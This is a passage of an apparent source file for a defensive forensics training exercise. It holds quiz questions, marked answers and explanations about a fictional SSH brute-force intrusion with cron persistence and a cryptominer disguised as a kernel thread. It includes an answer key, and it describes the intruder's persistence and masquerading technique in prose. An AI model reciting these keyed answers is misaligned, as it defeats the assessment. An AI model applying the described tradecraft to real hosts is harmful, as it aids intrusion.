        "res=failed together with the sudo line 'user NOT in sudoers' means no sudo rule exists for this account, and every later auditd SYSCALL confirms it — uid, euid and auid stay 1004 to the end. Nothing in the timeline shows an escalation, so assuming one contradicts the evidence. A mistyped password produces a different sudo message ('3 incorrect password attempts'), not 'NOT in sudoers'. And USER_CMD carries terminal=pts/0, which is itself proof of an interactive tty, so the last option is contradicted by the record it claims to interpret.",
    },
    {
      id: "lsc_q3",
      xp: 75,
      kind: "single",
      prompt:
        "In lsc_09 an unprivileged account creates a file under /var/spool/cron/crontabs, a directory it does not own. Which detail in the SYSCALL record explains how that was permitted?",
      hint: "Compare the uid fields with the gid fields on that one record.",
      options: [
        { value: "setgid", label: "egid becomes 102 while uid and euid stay 1004 — /usr/bin/crontab is setgid crontab and writes on the user's behalf" },
        { value: "world", label: "The spool directory is world-writable at mode 0777, so any local account can create files inside it directly" },
        { value: "root_cron", label: "The cron daemon runs as root and creates the file itself after the user submits the job over a local socket" },
        { value: "sudo_rule", label: "A narrow sudoers entry permits svc-backup to run /usr/bin/crontab as root without supplying a password" },
      ],
      answer: "setgid",
      explanation:
        "The record shows uid=1004 euid=1004 but egid=102 sgid=102 fsgid=102, and the resulting file is ouid=1004 ogid=102 mode=0600. That gid shift is the setgid bit on /usr/bin/crontab doing exactly its job, which is why a user crontab needs no root at all. The spool directory is mode 1730 root:crontab, never world-writable. Cron reads the spool but does not create entries on request. And a sudoers entry is directly refuted by lsc_06. This is also why the persistence had to be a user crontab: writing to /etc/cron.d or a systemd unit would have required root, which the timeline never grants.",
    },
    {
      id: "lsc_q4",
      xp: 100,
      kind: "single",
      prompt:
        "You must attribute the mining process in lsc_10 to a specific identity for the incident report. Which pair of events, read together, ties the miner to a named account and a named external actor?",
      hint: "One event names the identity, another names the process running under it. Neither is enough alone.",
      options: [
        { value: "auth_proc", label: "lsc_04 and lsc_10 — the Accepted password for svc-backup from 193.32.162.140, and the miner running as that same uid 1004" },
        { value: "fw_pool", label: "lsc_11 and lsc_13 — the outbound session to the pool, and the load alert showing the process burning 690% CPU" },
        { value: "dl_chmod", label: "lsc_07 and lsc_08 — the curl download of the ELF payload, and the chmod that made that same file executable" },
        { value: "cron_bkp", label: "lsc_09 and lsc_12 — the crontab written for svc-backup, and the nightly restic job started from cron on the host" },
      ],
      answer: "auth_proc",
      explanation:
        "Attribution needs an identity plus an action under it. lsc_04 supplies the identity and its origin: svc-backup authenticated by password from 193.32.162.140, auid=1004, session 41. lsc_10 supplies the action: the miner running as UID 1004 with bash as its parent, in that same session lineage. Together they name both the account and the external address. The firewall-and-alert pair proves impact but names no user. The download-and-chmod pair proves file staging but names no external session. The crontab-and-restic pair mixes the malicious job with an unrelated legitimate one and proves nothing about who logged in.",
    },
    {
      id: "lsc_q5",
      xp: 75,
      kind: "multi",
      prompt:
        "The load alert in lsc_13 lists kworker at 690% and restic at 96%. Select the TWO observations that identify kworker as the malicious consumer and clear restic.",
      hint: "Look at where each binary lives and what launched it.",
      options: [
        { value: "path", label: "kworker executes from a hidden directory under a user home, while restic executes from the system path /usr/bin" },
        { value: "parent", label: "kworker was launched by an interactive bash in the SSH session, while restic was launched by cron from a root-owned file" },
        { value: "cpu", label: "kworker consumes far more CPU than restic, and mining software always saturates every core it can reach" },
        { value: "name", label: "kworker is not a name used by any Linux distribution, while restic is a widely packaged open-source utility" },
      ],
      answer: ["path", "parent"],
      explanation:
        "Location and lineage are the discriminators. A legitimate service binary lives in the system path and is started by an init or cron chain — restic satisfies both, and its /etc/cron.d entry is root-owned, which means it was provisioned by an administrator. kworker satisfies neither: it sits in ~/.cache/.fontconfig and its parent is the attacker's interactive shell. CPU share is not evidence — the backup job is legitimately CPU-heavy, and this miner was explicitly capped with --max-cpu-usage 90, so 'more CPU means malicious' would misclassify plenty of real workloads. The last option is a factual trap: kworker IS a real kernel thread name, which is precisely why it was chosen for masquerading — but real kworker threads are kernel tasks with no on-disk binary and never appear under /home.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Exposed SSH → Cron Persistence → Cryptominer",
    threat_actor: "UNC-COALFIRE (opportunistic, financially motivated)",
    attack_kind: "linux_ssh_cryptomining",
    briefing: "A sustained load-average alert fired on nix-bkp-01, a Linux backup server, at 23:15 — the host has been above threshold for over half an hour. The nightly backup job is also running on it. Confirm what is consuming the CPU.",
    narrative:
      "nix-bkp-01 is a Linux backup server at Northwind Logistics. Two years ago someone moved its SSH daemon from port 22 to port 2202 and recorded it as a security improvement. It was not — the host still answers the whole internet, and automated scanners find non-standard SSH ports in minutes. On the evening of Tuesday 14 April 2026 an opportunistic crew began guessing passwords against it from a small pool of hosting-provider addresses. The guessing started with generic usernames, then narrowed to svc-backup, a service account created for a since-retired rsync job and left with a password that had never been rotated. At 22:38 one node logged in — a node that had never sent a single failed attempt, because in these operations the cracking infrastructure and the hands-on-keyboard infrastructure are deliberately different machines. What followed is unglamorous and extremely common: the intruder checked who they were, discovered they could not become root, and settled for what an ordinary user account can still do. They pulled an ELF binary over plain HTTP into a hidden folder in their own home directory, renamed it after a kernel thread, installed a per-user crontab to keep it alive, and pointed it at a Monero pool. Thirty-seven minutes later the monitoring stack noticed the load average, not the intrusion. Your task: prove from auth.log exactly when and how the account was taken, establish from auditd what privileges the intruder actually held, explain how persistence was possible without root, and separate the miner from the legitimate backup job sharing the same CPU alert.",
    learning_objectives: [
      "Read sshd/auth.log to distinguish password from publickey authentication, locate the moment a brute-force campaign converts into a successful login, and recognise that in a distributed campaign the address that succeeds may appear in none of the failure records",
      "Use auditd uid/gid/euid/egid/auid fields — not Windows-style privilege concepts — to establish the exact privilege level an intruder holds on a Linux host",
      "Explain how an unprivileged account installs cron persistence through the setgid crontab binary, and why /etc/cron.d and systemd units were out of reach",
      "Correlate authentication evidence with process and network evidence to attribute a mining process to a named account and external source address",
      "Discriminate resource hijacking from a legitimate high-CPU batch job using binary location, parent process and job ownership rather than CPU share",
    ],
    alerts: [], // alerts are attached by the catalogue wiring
    events,
    iocs,
    killchain,
    questions,
  };
}
